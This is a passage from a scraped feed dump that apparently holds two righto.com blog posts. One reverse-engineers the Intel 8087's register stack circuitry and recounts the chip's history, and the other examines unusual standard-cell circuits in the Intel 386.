challenge.\\n \u21a9 \\n \\n \\n '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:51:49</p>"},{"location":"righto.com/The%20stack%20circuitry%20of%20the%20Intel%208087%20floating%20point%20chip%2C%20reverse-engineered_20251209/","title":"The stack circuitry of the Intel 8087 floating point chip, reverse-engineered","text":"<p>\u6765\u6e90: righto.com \u53d1\u5e03\u65f6\u95f4: 2025-12-09T09:54:00.000-08:00 \u94fe\u63a5: http://www.righto.com/2025/12/8087-stack-circuitry.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.righto.com/feeds/posts/default', 'value': ' Early microprocessors were very slow when operating with floating-point numbers.\\nBut in 1980, Intel introduced the 8087 floating-point coprocessor, performing\\nfloating-point operations up\\nto 100 times faster.\\nThis was a huge benefit for IBM PC\\napplications such as AutoCAD, spreadsheets, and flight simulators.\\nThe 8087 was so effective that today\\'s computers still use a floating-point system based on the 8087. 1 \\n \\n\\n The 8087 was an extremely complex chip for its time, containing somewhere between\\n40,000 and 75,000 transistors, depending on the source. 2 \\nTo explore how the 8087 works, I opened up a chip and took numerous photos of the silicon die with a microscope.\\nAround the edges of the die, you can see the hair-thin bond wires that connect the chip to its 40 external pins.\\nThe complex patterns on the die are formed by its metal wiring, as well as the polysilicon and silicon underneath.\\nThe bottom half of the chip is the \"datapath\", the circuitry that performs calculations on 80-bit floating point values. \\nAt the left of the datapath, a constant ROM holds important constants such as \u03c0.\\nAt the right are the eight registers that form the stack, along with the stack control circuitry. \\n Die of the Intel 8087 floating point unit chip, with main functional blocks labeled. The die is 5mm\u00d76mm.  Click for a larger image. \\n The chip\\'s instructions are defined by the large microcode ROM in the middle.\\nThis ROM is very unusual; it is semi-analog, storing two bits per transistor by using four transistor sizes.\\nTo execute a floating-point instruction, the 8087 decodes the instruction and the microcode engine starts executing\\nthe appropriate micro-instructions from the microcode ROM.\\nThe decode circuitry to the right of the ROM generates the appropriate control signals from each micro-instruction.\\nThe bus registers and control circuitry handle interactions with the main 8086 processor and the rest of the system.\\nFinally, the bias generator \\nuses a charge pump to create a negative voltage to bias the chip\\'s substrate, the underlying silicon. \\n The stack registers and control circuitry (in red above) are the subject of this blog post. \\nUnlike most processors, the 8087 organizes its registers in a stack, with instructions operating on the top of the stack.\\nFor instance, the square root instruction replaces the value on the top of the stack with its square root.\\nYou can also access a register relative to the top of the stack, for instance, adding the top value to the value two positions down from the top.\\nThe stack-based architecture was intended to improve the instruction set, simplify compiler design, and make function\\ncalls more efficient, although it didn\\'t work as well as hoped. \\n The stack on the 8087. From The 8087 Primer , page 60. \\n The diagram above shows how the stack operates. The stack consists of eight registers, with the Stack Top\\n(ST) indicating the current top of the stack.\\nTo push a floating-point value onto the stack, the Stack Top is decremented and then the value is stored in the new top register.\\nA pop is performed by copying the value from the stack top and then incrementing the Stack Top.\\nIn comparison, most processors specify registers directly, so register 2 is always the same register. \\n The registers \\n The stack registers occupy a substantial area on the die of the 8087 because floating-point numbers take many bits.\\nA floating-point number consists of a fractional part (sometimes called the mantissa or significand), along with\\nthe exponent part; the exponent allows floating-point numbers to cover a range from extremely small to extremely\\nlarge.\\nIn the 8087, floating-point numbers are 80 bits: 64 bits of significand, 15 bits of exponent, and a sign bit.\\nAn 80-bit register was very large in the era of 8-bit or 16-bit computers; the eight registers in the 8087\\nwould be equivalent to 40 registers in the 8086 processor. \\n The registers in the 8087 form an 8\u00d780 grid of cells. The close-up shows an 8\u00d78 block. I removed the metal layer with acid to reveal the underlying silicon circuitry. \\n The registers store each bit in a static RAM cell. Each cell has two inverters connected in a loop.\\nThis circuit forms a stable feedback loop, with one inverter on and one inverter off.\\nDepending on which inverter is on, the circuit stores a 0 or a 1.\\nTo write a new value into the circuit, one of the lines is pulled low, flipping the loop into the desired state.\\nThe trick is that each inverter uses a very weak transistor to pull the output high, so its output is easily overpowered\\nto change the state. \\n Two inverters in a loop can store a 0 or a 1. \\n These inverter pairs are arranged in an 8 \u00d7 80 grid that implements eight words of 80 bits. Each of the 80 rows has two bitlines that provide access to a bit.\\nThe bitlines provide both read and write access to a bit; the pair of bitlines allows either inverter to be pulled low to store the desired bit value.\\nEight vertical wordlines enable access to one word, one column of 80 bits.\\nEach wordline turns on 160 pass transistors, connecting the bitlines to the inverters in the selected column.\\nThus, when a wordline is enabled, the bitlines can be used to read or write that word. \\n Although the chip looks two-dimensional, it actually consists of multiple layers.\\nThe bottom layer is silicon.\\nThe pinkish regions below are where the silicon has been \"doped\" to change its electrical properties, making it an active\\npart of the circuit.\\nThe doped silicon forms a grid of horizontal and vertical wiring, with larger doped regions in the middle.\\nOn top of the silicon, polysilicon wiring provides two functions. First, it provides a layer of wiring to connect the circuit.\\nBut more importantly, when polysilicon crosses doped silicon, it forms a transistor. The polysilicon provides the gate, turning the transistor on and off.\\nIn this photo, the polysilicon is barely visible, so I\\'ve highlighted part of it in red.\\nFinally, horizontal metal wires provide a third layer of interconnecting wiring.\\nNormally, the metal hides the underlying circuitry, so I removed the metal with acid for this photo.\\nI\\'ve drawn blue lines to represent the metal layer.\\nContacts provide connections between the various layers. \\n A close-up of a storage cell in the registers. The metal layer and most of the polysilicon have been removed to show the underlying silicon. \\n The layers combine to form the inverters and selection transistors of a memory cell, indicated with the dotted line below.\\nThere are six transistors (yellow), where polysilicon crosses doped silicon. Each inverter has a transistor that\\npulls the output low and a weak transistor to pull the output high.\\nWhen the word line (vertical polysilicon) is active, it connects the selected inverters to the bit lines (horizontal metal) through the two selection\\ntransistors.\\nThis allows the bit to be read or written. \\n The function of the circuitry in a storage cell. \\n Each register has two tag bits associated with it, an unusual form of metadata to indicate\\nif the register is empty, contains zero, contains a valid value, or\\ncontains a special value such as infinity.\\nThe tag bits are used to optimize performance internally and are mostly irrelevant to the programmer.\\nAs well as being accessed with a register, the tag bits can be accessed in parallel as a 16-bit \"Tag Word\".\\nThis allows the tags to be saved or loaded as part of the 8087\\'s state, for instance,\\nduring interrupt handling. \\n The decoder \\n The decoder circuit, wedged into the middle of the register file, selects one of the registers.\\nA register is specified internally with a 3-bit value. The decoder circuit energizes one of the eight register select\\nlines based on this value. \\n The decoder circuitry is straightforward: it has eight 3-input NOR gates to match one of the eight bit patterns.\\nThe select line is then powered through a high-current driver that uses large transistors.\\n(In the photo below, you can compare the large serpentine driver transistors to the small transistors in a bit cell.) \\n The decoder circuitry has eight similar blocks to drive the eight select lines. \\n The decoder has an interesting electrical optimization.\\nAs shown earlier, the register select lines are eight polysilicon lines running vertically, the length of the\\nregister file. \\nUnfortunately, polysilicon has fairly high resistance, better than silicon but much worse than metal.\\nThe problem is that the resistance of a long polysilicon line will slow down the system.\\nThat is, the capacitance of transistor gates in combination with high resistance causes an RC (resistive-capacitive) delay in the signal. \\n The solution is that the register select lines also run in the metal layer, a second set of lines immediately to the\\nright of the register file.\\nThese lines branch off from the register file about 1/3 of the way down, run to the bottom, and then connect back\\nto the polysilicon select lines at the bottom.\\nThis reduces the maximum resistance through a select line, increasing the speed. \\n A diagram showing how 8 metal lines run parallel to the main select lines. The register file is much taller than shown; the middle has been removed to make the diagram fit. \\n The stack control circuitry \\n A stack needs more control circuitry than a regular register file, since the circuitry must keep track of the\\nposition of the top of the stack. 3 \\nThe control circuitry increments and decrements the top of stack (TOS) pointer as values are pushed or popped\\n(purple). 4 \\nMoreover, an 8087 instruction can access a register based on its offset, for instance the third register\\nfrom the top.\\nTo support this, the control circuitry can temporarily add an offset to the top of stack position (green).\\nA multiplexer (red) selects either the top of stack or the adder output, and feeds it to the decoder (blue),\\nwhich selects one of the eight stack registers in the register file (yellow), as described earlier. \\n The register stack in the 8087. Adapted from Patent USRE33629E . I don\\'t know what the GRX field is. I also don\\'t know why this shows a subtractor and not an adder. \\n \\n\\n The physical implementation of the stack circuitry is shown below.\\nThe logic at the top selects the stack operation based on the 16-bit micro-instruction. 5 \\nBelow that are the three latches that hold the top of stack value.\\n(The large white squares look important, but they are simply \"jumpers\" from the ground line to the circuitry, passing\\nunder metal wires.) \\n The stack control circuitry. The blue regions on the right are oxide residue that remained when I dissolved the metal rail for the 5V power.\\n \\n The three-bit adder is at the bottom, along with the multiplexer.\\nYou might expect the adder to use a simple \"full adder\" circuit. Instead, it is\\na faster carry-lookahead adder.\\nI won\\'t go into details here, but the summary is that at each bit position, an AND gate produces a Carry Generate\\nsignal while an XOR gate produces a Carry Propagate signal.\\nLogic gates combine these signals to produce the output bits in parallel, avoiding the slowdown of the carry rippling\\nthrough the bits. \\n The incrementer/decrementer uses a completely different approach.\\nEach of the three bits uses a toggle flip-flop.\\nA few logic gates determine if each bit should be toggled or should keep its previous value.\\nFor instance, when incrementing, the top bit is toggled if the lower bits are 11 (e.g. incrementing from 011 to 100).\\nFor decrementing, the top bit is toggled if the lower bits are 00 (e.g. 100 to 011).\\nSimpler logic determines if the middle bit should be toggled.\\nThe bottom bit is easier, toggling every time whether incrementing or decrementing. \\n The schematic below shows the circuitry for one bit of the stack.\\nEach bit is implemented with a moderately complicated flip-flop that can be cleared, loaded with\\na value, or toggled, based on control signals from the microcode.\\nThe flip-flop is constructed from two set-reset (SR) latches. Note that the flip-flop outputs are crossed when fed back\\nto the input, providing the inversion for the toggle action.\\nAt the right, the multiplexer selects either the register value or the sum from the adder (not shown), generating the signals\\nto the decoder. \\n Schematic of one bit of the stack. \\n Drawbacks of the stack approach \\n According to the designers of the 8087, 7 \\nthe main motivation for using a stack rather than a flat register set was that instructions didn\\'t have enough bits to address multiple register operands.\\nIn addition, a stack has \"advantages over general registers for expression parsing and nested function calls.\"\\nThat is, a stack works well for a mathematical expression since sub-expressions can be evaluated on the top\\nof the stack.\\nAnd for function calls, you avoid the cost of saving registers to memory, since the subroutine can use the stack without disturbing the values underneath.\\nAt least that was the idea. \\n \\n\\n The main problem is \"stack overflow\".\\nThe 8087\\'s stack has eight entries, so if you push a ninth value onto the stack, the stack will overflow.\\nSpecifically, the top-of-stack pointer will wrap around, obliterating the bottom value on the stack.\\nThe 8087 is designed to detect a stack overflow using the register tags:\\npushing a value to a non-empty register triggers an invalid operation exception. 6 \\n The designers expected that stack overflow would be rare and could be handled by the operating system (or library code).\\nAfter detecting a stack overflow, the software should dump the existing stack to memory to\\nprovide the illusion of an infinite stack.\\nUnfortunately, bad design decisions made it difficult \"both technically and commercially\" to handle stack overflow. \\n One of the 8087\\'s designers (Kahan) attributes the 8087\\'s stack problems to the time difference between California,\\nwhere the designers lived, and Israel, where the 8087 was implemented.\\nDue to a lack of communication, each team thought the other was implementing the overflow software.\\nIt wasn\\'t until the\\n8087 was in production that they realized that \"it might not be possible to handle 8087 stack underflow/overflow in a reasonable way. It\\'s not impossible, just impossible to do it in a reasonable way.\" \\n As a result, the stack was largely a problem rather than a solution.\\nMost 8087 software saved the full stack to memory before performing\\na function call, creating more memory traffic.\\nMoreover, compilers turned out to work better with regular registers than a stack,\\nso compiler writers awkwardly used the stack to emulate regular registers.\\nThe GCC compiler reportedly needs 3000 lines of extra code to support the x87 stack. \\n In the 1990s, Intel introduced a new floating-point system called SSE , followed by AVX in 2011.\\nThese systems use regular (non-stack) registers and provide parallel operations for higher performance,\\nmaking the 8087\\'s stack instructions largely obsolete. \\n The success of the 8087 \\n At the start, Intel was unenthusiastic about producing the 8087, viewing it as unlikely to be a success.\\nJohn Palmar, a principal architect of the chip, had little success convincing\\nskeptical Intel management that the market for the 8087 was enormous.\\nEventually,\\nhe said, \"I\\'ll tell you what. I\\'ll relinquish my salary, provided you\\'ll write down your number of how many you expect to sell, then give me a dollar for every one you sell beyond that.\" 7 \\nIntel didn\\'t agree to the deal\u2014which would have made a fortune for Palmer\u2014but they reluctantly agreed to produce the chip. \\n Intel\\'s Santa Clara engineers shunned the 8087, considering it unlikely to work:\\nthe 8087 would be two to three times more complex than the 8086,\\nwith a die so large that a wafer might not have a single working die.\\nInstead, Rafi Nave, at Intel\\'s Israel site, took on the risky project: \u201cListen, everybody knows it\\'s not going to work, so if it won\\'t work, I would just fulfill their expectations or their assessment.\\nIf, by chance, it works, okay, then we\\'ll gain tremendous respect and tremendous breakthrough on our abilities.\u201d \\n A small team of seven engineers developed the 8087 in Israel.\\nThey designed the chip on Mylar sheets: a millimeter on Mylar represented a micron on the physical chip.\\nThe drawings were then digitized on a Calma system by clicking on each polygon to create the layout.\\nWhen the chip was moved into production,\\nthe yield was very low but better than feared: two working dies per four-inch wafer. \\n The 8087 ended up being a large success, said to have been Intel\\'s most profitable product line at times.\\nThe success of the 8087 (along with the 8088) cemented the reputation of Intel Israel, which eventually became Israel\\'s largest tech employer.\\nThe benefits of floating-point hardware proved to be so great that Intel integrated the floating-point unit into later processors\\nstarting with the 80486 (1989).\\nNowadays, most modern computers, from cellphones to mainframes, provide floating point based on the\\n8087,\\nso I consider the 8087 one of the most influential chips ever created. \\n For more, follow me on\\n Bluesky ( @righto.com ),\\nMastodon ( @kenshirriff@oldbytes.space ),\\nor RSS .\\nI wrote some articles about the 8087 a few years ago, including the die ,\\n the ROM ,\\nthe bit shifter ,\\nand the constants , so you may have seen some of this material before. \\n Notes and references \\n \\n \\n \\n Most computers now use the IEEE 754 floating-point standard,\\nwhich is based on the 8087.\\nThis standard has been awarded a\\n milestone in computation. \u21a9 \\n \\n \\n Curiously, reliable sources differ on the number of transistors in the 8087 by almost a factor of 2.\\n  Intel says 40,000 , as does designer William Kahan ( link ).\\n  But in A Numeric Data Processor , designers Rafi Nave and John Palmer wrote that the chip contains \"the equivalent of over 65,000 devices\" (whatever \"equivalent\" means).\\n  This number is echoed by a contemporary article in Electronics (1980) that says \"over 65,000 H-MOS transistors on a 78,000-mil 2 die.\"\\n  Many other sources, such as Upgrading &amp; Repairing PCs , specify 45,000 transistors.\\n  Designer Rafi Nave stated that the 8087 has\\n  63,000 or 64,000 transistors if you count the ROM transistors directly, but if you count ROM transistors as\\n  equivalent to two transistors, then you get about 75,000 transistors. \u21a9 \\n \\n \\n The 8087 has a 16-bit Status Word that\\ncontains the stack top pointer, exception flags, the four-bit\\ncondition code, and other values.\\nAlthough the Status Word appears to be a 16-bit register, it is not implemented as a register.\\nInstead, parts of the Status Word are stored in various places around the chip: the stack top pointer is\\nin the stack circuitry, the exception flags are part of the interrupt circuitry, the condition code bits are\\nnext to the datapath, and so on.\\nWhen the Status Word is read or written, these various circuits are connected to the 8087\\'s internal data\\nbus, making the Status Word appear to be a monolithic entity.\\nThus, the stack circuitry includes support for reading and writing it. \u21a9 \\n \\n \\n Intel filed several patents on the 8087, including Numeric data processor ,\\nanother Numeric data processor ,\\n Programmable bidirectional shifter ,\\n Fraction bus for use in a numeric data processor , and\\n System bus arbitration, circuitry and methodology . \u21a9 \\n \\n \\n I started looking at the stack in detail to reverse engineer the micro-instruction format and determine how the\\n8087\\'s microcode works.\\nI\\'m working with the \"Opcode Collective\" on Discord on this project, but progress is slow due to the complexity of\\nthe micro-instructions. \u21a9 \\n \\n \\n The 8087 detects stack underflow in a similar manner. If you pop more values from the stack than are present,\\nthe tag will indicate that the register is empty and shouldn\\'t be accessed. This triggers an invalid operation\\nexception. \u21a9 \\n \\n \\n The 8087 is described in detail in The 8086 Family User\\'s Manual, Numerics Supplement .\\n  An overview of the stack is on page 60 of The 8087 Primer by Palmer and Morse.\\n  More details are in Kahan\\'s On the Advantages of the 8087\\'s Stack , \\n  an unpublished course note (maybe for CS 279 ?) with a date of Nov 2, 1990 or perhaps August 23, 1994 .\\n  Kahan discusses why the 8087\\'s design makes it hard to handle stack overflow in How important is numerical accuracy , Dr. Dobbs, Nov. 1997.\\n  Another information source is the Oral History of Rafi Nave \u21a9 \u21a9 \\n \\n \\n '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:51:49</p>"},{"location":"righto.com/Unusual%20circuits%20in%20the%20Intel%20386%27s%20standard%20cell%20logic_20251122/","title":"Unusual circuits in the Intel 386's standard cell logic","text":"<p>\u6765\u6e90: righto.com \u53d1\u5e03\u65f6\u95f4: 2025-11-22T08:15:00.000-08:00 \u94fe\u63a5: http://www.righto.com/2025/11/unusual-386-standard-cell-circuits.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.righto.com/feeds/posts/default', 'value': ' I\\'ve been studying the standard cell circuitry in the Intel 386 processor recently.\\nThe 386, introduced in 1985, was Intel\\'s most complex processor at the time, containing 285,000 transistors.\\nIntel\\'s existing design techniques couldn\\'t handle this complexity and the chip began to fall behind schedule.\\nTo meet the schedule, the 386 team started using a technique called standard cell logic.\\nInstead of laying out each transistor manually, the layout process was performed by a computer. \\n The idea behind standard cell logic is to create standardized circuits (standard cells) for each type of logic element, such\\nas an inverter, NAND gate, or latch.\\nYou feed your circuit description into software that selects the necessary cells, \\npositions these cells into columns, and then routes the wiring between the cells.\\nThis \"automatic place and route\" process creates the chip layout much faster than manual layout.\\nHowever, switching to standard cells was a risky decision since if the software couldn\\'t create a\\ndense enough layout, the chip couldn\\'t be manufactured.\\nBut in the end, the 386 finished ahead of schedule, an almost unheard-of accomplishment. 1 \\n The 386\\'s standard cell circuitry contains a few circuits that I didn\\'t expect.\\nIn this blog post, I\\'ll take a quick look at some of these circuits:\\nsurprisingly large multiplexers, a transistor that doesn\\'t fit into the standard cell layout,\\nand inverters that turned out not to be inverters.\\n(If you want more background on standard cells in the 386, see my earlier post,\\n\" Reverse engineering standard cell logic in the Intel 386 processor \".) \\n The photo below shows the 386 die with the automatic-place-and-route regions highlighted; I\\'m focusing\\non the red region in the lower right.\\nThese blocks of logic have cells arranged in rows, giving them a characteristic striped appearance.\\nThe dark stripes are the transistors that make up the logic gates, while the lighter regions between the stripes are the\\n\"routing channels\" that hold the wiring that connects the cells.\\nIn comparison,\\nfunctional blocks\\nsuch as the datapath on the left\\nand the microcode ROM in the lower right\\nwere designed manually to optimize density and performance, giving them a more solid appearance. \\n The 386 die with the standard-cell regions highlighted. \\n As for other features on the chip,\\nthe black circles around the border are bond wire connections that go to the chip\\'s external pins.\\nThe chip has two metal layers, a small number by modern\\nstandards, but a jump from the single metal layer of earlier processors such as the 286.\\n(Providing two layers of metal made automated routing practical: one layer can hold horizontal wires while the other layer\\ncan hold vertical wires.)\\nThe metal appears white in larger areas, but\\npurplish where circuitry underneath roughens its surface.\\nThe underlying silicon and the polysilicon wiring are obscured by the metal layers. \\n The giant multiplexers \\n The standard cell circuitry that I\\'m examining (red box above) is part of the control logic that selects registers\\nwhile executing an instruction.\\nYou might think that it is easy to select which registers take part in an instruction, but\\ndue to the complexity of the x86 architecture, it is more difficult.\\nOne problem is that a 32-bit register such as EAX can also be treated as the 16-bit register AX,\\nor two 8-bit registers AH and AL.\\nA second problem is that some instructions include a \"direction\" bit that switches the source and\\ndestination registers.\\nMoreover, sometimes the register is specified by bits in the instruction, but in other cases,\\nthe register is specified by the microcode.\\nDue to these factors, selecting the registers for an operation is a complicated process with many\\ncases, using control bits from the instruction, from the microcode, and from other sources. \\n Three registers need to be selected for an operation\u2014two source registers and a destination register\u2014and there\\nare about 17 cases that need to be handled.\\nRegisters are specified with 7-bit control signals that select one of the 30 registers and control\\nwhich part of the register is accessed.\\nWith three control signals, each 7 bits wide, and about 17 cases for each, you can see that\\nthe register control logic is large and complicated.\\n(I wrote more about the 386\\'s registers here .) \\n I\\'m still reverse engineering the register control logic, so I won\\'t go into details.\\nInstead, I\\'ll discuss how the register control circuit uses multiplexers, implemented with standard cells.\\nA multiplexer is a circuit that combines multiple\\ninput signals into a single output by selecting one of the inputs. 2 \\nA multiplexer can be implemented with logic gates, for instance, by ANDing each input with the\\ncorresponding control line, and then ORing the results together.\\nHowever, the 386 uses a different approach\u2014CMOS switches\u2014that avoids a large AND/OR gate. \\n Schematic of a CMOS switch. \\n The schematic above shows how a CMOS switch is constructed from two MOS transistors.\\nWhen the two transistors are on, the output is connected to the input, but when the two transistors are\\noff, the output is isolated.\\nAn NMOS transistor is turned on when its input is high, but a PMOS transistor is turned on when its\\ninput is low . Thus, the switch uses two control inputs, one inverted.\\nThe motivation for using two transistors is that an NMOS transistor is better at pulling the output\\nlow, while a PMOS transistor is better at pulling the output high, so combining them yields the best performance. 3 \\nUnlike a logic gate, the CMOS switch has no amplification, so a signal is weakened as it passes through the switch.\\nAs will be seen below, inverters can be used to amplify the signal. \\n The image below shows how CMOS switches appear under the microscope.\\nThis image is very hard to interpret because the two layers of metal on the 386 are packed together densely, but you\\ncan see that some wires run horizontally and others run vertically.\\nThe bottom layer of metal (called M1) runs vertically in the routing area, as well as providing internal\\nwiring for a cell.\\nThe top layer of metal (M2) runs horizontally; unlike M1, the M2 wires can cross a cell.\\nThe large circles are vias that connect the M1 and M2 layers, while the small circles are connections\\nbetween M1 and polysilicon or M1 and silicon.\\nThe central third of the image is a column of standard cells with two CMOS switches outlined in green.\\nThe cells are bordered by the vertical ground rail and\\n+5V rail that power the cells. \\nThe routing areas are on either side of the cells, holding the wiring that connects the cells. \\n Two CMOS switches, highlighted in green. The lower switch is flipped vertically compared to the upper switch. \\n Removing the metal layers reveals the underlying silicon with a layer of polysilicon wiring on top.\\nThe doped silicon regions show up as dark outlines.\\nI\\'ve drawn the polysilicon in green; it forms a transistor (brighter green) when it crosses doped silicon.\\nThe metal ground and power lines are shown in blue and red, respectively, with other metal wiring in purple.\\nThe black dots are vias between layers.\\nNote how metal wiring (purple) and polysilicon wiring (green) are combined to route signals within\\nthe cell.\\nAlthough this standard cell is complicated, the important thing is that it only needs to be designed once.\\nThe standard cells for different functions are all designed to have the same width, so the cells can be arranged in\\ncolumns, snapped together like Lego bricks. \\n A diagram showing the silicon for a standard-cell switch. The polysilicon is shown in green. The bottom metal is shown in blue, red, and purple. \\n To summarize, this switch circuit allows the input to be connected to the output or disconnected, controlled by the select signal.\\nThis switch is more complicated than the earlier schematic because it includes two inverters to amplify\\nthe signal.\\nThe data input and the two select lines are connected to the polysilicon (green); the cell is designed so\\nthese connections can be made on either side.\\nAt the top, the input goes through a standard two-transistor inverter.\\nThe lower left has two transistors, combining the NMOS half of an inverter with the NMOS half of the switch.\\nA similar circuit on the right combines the PMOS part of an inverter and switch.\\nHowever, because PMOS transistors are weaker, this part of the circuit is duplicated. \\n A multiplexer is constructed by combining multiple switches, one for each input.\\nTurning on one switch will select the corresponding input.\\nFor instance, a four-to-one multiplexer has four switches, so it can select one of the four inputs. \\n A four-way multiplexer constructed from CMOS switches and individual transistors. \\n The schematic above shows a hypothetical multiplexer with four inputs.\\nOne optimization is that if an input is always 0, the PMOS transistor can be omitted. Likewise,\\nif an input is always 1, the NMOS transistor can be omitted.\\nOne set of select lines is activated at a time to select the corresponding input.\\nThe pink circuit selects 1,\\ngreen selects input A, yellow selects input B, and blue selects 0.\\nThe multiplexers in the 386 are similar, but have more inputs. \\n The diagram below shows how much circuitry is devoted to multiplexers in this block of standard cells.\\nThe green, purple, and red cells correspond to the multiplexers driving the three register control\\noutputs.\\nThe yellow cells are inverters that generate the inverted control signals for the CMOS switches.\\nThis diagram also shows how the automatic layout of cells results in a layout that appears random. \\n A block of standard-cell logic with multiplexers highlighted. The metal and polysilicon layers were removed for this photo, revealing the silicon transistors. \\n The misplaced transistor \\n The idea of standard-cell logic is that standardized cells are arranged in columns.\\nThe space between the cells is the \"routing channel\", holding the wiring that links the cells.\\nThe 386 circuitry follows this layout, except for one single transistor, sitting between two columns\\nof cells. \\n The \"misplaced\" transistor, indicated by the arrow. The irregular green regions are oxide that was incompletely removed. \\n I wrote some software tools to help me analyze the standard cells. Unfortunately, my tools\\nassumed that all the cells were in columns, so this one wayward transistor caused me considerable inconvenience. \\n The transistor turns out to be a PMOS transistor, pulling a signal high as part of a multiplexer.\\nBut why is this transistor out of place?\\nMy hypothesis is that the transistor is a bug fix.\\nRegenerating the cell layout was very costly, taking many hours on an IBM mainframe computer.\\nPresumably, someone found that they could just stick the necessary transistor into an unused spot in the\\nrouting channel, manually add the necessary wiring, and avoid the delay of regenerating all the cells. \\n The fake inverter \\n The simplest CMOS gate is the inverter, with an NMOS transistor to pull the output low and a\\nPMOS transistor to pull the output high.\\nThe standard cell circuitry that I examined contains over a hundred inverters of various\\nsizes.\\n(Performance is improved by using inverters that aren\\'t too small but also aren\\'t\\nlarger than necessary for a particular circuit. Thus, the standard cell library includes inverters of multiple sizes.) \\n The image below shows a medium-sized standard-cell inverter under the microscope.\\nFor this image, I removed the two metal layers with acid to show the underlying polysilicon\\n(bright green) and silicon (gray).\\nThe quality of this image is\\npoor\u2014it is difficult to remove the metal without destroying the polysilicon\u2014but the diagram below\\nshould clarify the circuit.\\nThe inverter has two transistors: a PMOS transistor connected to +5 volts to pull the output high when\\nthe input is 0, and an NMOS transistor connected to ground to pull the output low when the input is 1.\\n(The PMOS transistor needs to be larger because PMOS transistors don\\'t function as well as NMOS transistors due to\\nsilicon physics.) \\n An inverter as seen on the die. The corresponding standard cell is shown below. \\n The polysilicon input line plays a key role: where it crosses the doped silicon, a transistor gate is\\nformed.\\nTo make the standard cell more flexible, the input to the inverter\\ncan be connected on either the left or the right; in this case, the input\\nis connected on the right and there is no connection on the left.\\nThe inverter\\'s output can be taken from the polysilicon on the upper left or the right, but in this case, it\\nis taken from the upper metal layer (not shown).\\nThe power, ground, and output lines are in the lower metal layer, which I have represented by\\nthe thin red, blue, and yellow lines. The black circles are connections between the metal layer and\\nthe underlying silicon. \\n This inverter appears dozens of times in the circuitry.\\nHowever, I came across a few inverters that didn\\'t make sense. The problem was\\nthat the inverter\\'s output was connected to the output of a multiplexer.\\nSince an inverter is either on or off, its value would clobber the output of the multiplexer. 4 \\nThis didn\\'t make any sense.\\nI double- and triple-checked the wiring to make sure I hadn\\'t messed up.\\nAfter more investigation, I found another problem: the input to a \"bad\" inverter didn\\'t make sense\\neither. The input consisted of two signals shorted together, which doesn\\'t work. \\n Finally, I realized what was going on. A \"bad inverter\" has the exact silicon layout of an inverter,\\nbut it wasn\\'t an inverter: it was independent NMOS and PMOS transistors with separate inputs.\\nNow it all made sense.\\nWith two inputs, the input signals were independent, not shorted together.\\nAnd since the transistors were controlled separately, the NMOS transistor could pull the output\\nlow in some circumstances, the PMOS transistor could pull the output high in other circumstances,\\nor both transistors could be off, allowing the multiplexer\\'s output to be used undisturbed.\\nIn other words, the \"inverter\" was just two more cases for the multiplexer. \\n The \"bad\" inverter. (Image is flipped vertically for comparison with the previous inverter.) \\n If you compare the \"bad inverter\" cell below with the previous cell, they look almost the same, but\\nthere are subtle differences.\\nFirst, the gates of the two transistors are connected in the real inverter, but disconnected\\nby a small gap in the transistor pair.\\nI\\'ve indicated this gap in the photo above; it is hard to tell if the gap is real or just an imaging\\nartifact, so I didn\\'t spot it.\\nThe second difference is that the \"fake\" inverter has two input connections, one to each transistor,\\nwhile the inverter has a single input connection.\\nUnfortunately, I assumed that the two connections were just a trick to route the signal across\\nthe inverter without requiring an extra wire.\\nIn total, this cell was used 32 times as a real inverter and 9 times\\nas independent transistors. \\n Conclusions \\n Standard cell logic and automatic place and route have a long history before the 386,\\nback to the early 1970s, so this isn\\'t an Intel invention. 5 \\nNonetheless, the 386 team deserves the credit for deciding to use this technology at a time when it\\nwas a risky decision.\\nThey needed to develop custom software for their placing and routing needs, so this wasn\\'t a trivial undertaking.\\nThis choice paid off and they completed the 386 ahead of schedule.\\nThe 386 ended up being a huge success for Intel, moving the x86 architecture to 32 bits and defining the dominant computer\\narchitecture for the rest of the 20th century. \\n If you\\'re interested in standard cell logic, I also wrote about standard cell logic in an IBM chip .\\nI plan to write more about the 386, so \\nfollow me on\\n Mastodon , Bluesky ,\\nor RSS for updates.\\nThanks to Pat Gelsinger and Roxanne Koester for providing helpful papers. \\n For more on the 386 and other chips, follow me on\\nMastodon ( @kenshirriff@oldbytes.space ),\\nBluesky ( @righto.com ),\\nor RSS .  (I\\'ve given up on Twitter.)\\nIf you want to read more about the 386, I\\'ve written about the clock pin ,\\n prefetch queue , die versions , packaging , and I/O circuits . \\n Notes and references \\n \\n \\n \\n The decision to use automatic place and route is described on page 13 of the Intel 386 Microprocessor Design and Development Oral History Panel , a very interesting document on the 386 with discussion from\\nsome of the people involved in its development. \u21a9 \\n \\n \\n Multiplexers often take a binary control signal to select the desired input.\\nFor instance, an 8-to-1 multiplexer selects one of 8 inputs, so a 3-bit control signal\\ncan specify the desired input.\\nThe 386\\'s multiplexers use a different approach with one control signal per input.\\nOne of the 8 control signals is activated to select the desired input.\\nThis approach is called a \"one-hot encoding\" since one control line is activated (hot)\\nat a time. \u21a9 \\n \\n \\n Some chips, such as the MOS Technology 6502 processor, are built with NMOS technology, without PMOS transistors.\\nMultiplexers in the 6502 use a single NMOS transistor, rather than the two transistors in the CMOS switch.\\nHowever, the performance of the switch is worse. \u21a9 \\n \\n \\n One very common circuit in the 386 is a latch constructed from an inverter loop and a switch/multiplexer.\\nThe inverter\\'s output and the switch\\'s output are connected together.\\nThe trick, however, is that the inverter is constructed from special weak transistors.\\nWhen the switch is disabled, the inverter\\'s weak output is sufficient to drive the loop.\\nBut to write a value into the latch, the switch is enabled and its output overpowers the weak\\ninverter. \\n The point of this is that there are circuits where an inverter and a multiplexer have their\\noutputs connected. However, the inverter must be constructed with special weak transistors, which is not the situation\\nthat I\\'m discussing. \u21a9 \\n \\n \\n I\\'ll provide more history on standard cells in this footnote.\\n RCA patented a bipolar standard cell in 1971,\\n but this was a fixed arrangement of transistors and resistors, more of a gate array than a modern\\n standard cell.\\n Bell Labs researched standard cell layout techniques in the early 1970s, calling them Polycells, including\\n a 1973 paper by Brian Kernighan.\\n By 1979, A Guide to LSI Implementation discussed the standard cell approach and\\n it was described as well-known in this patent application .\\n Even so, Electronics called these design methods \"futuristic\" in 1980. \\n Standard cells became popular in the mid-1980s as faster computers and improved design software made\\n it practical to produce semi-custom designs that used standard 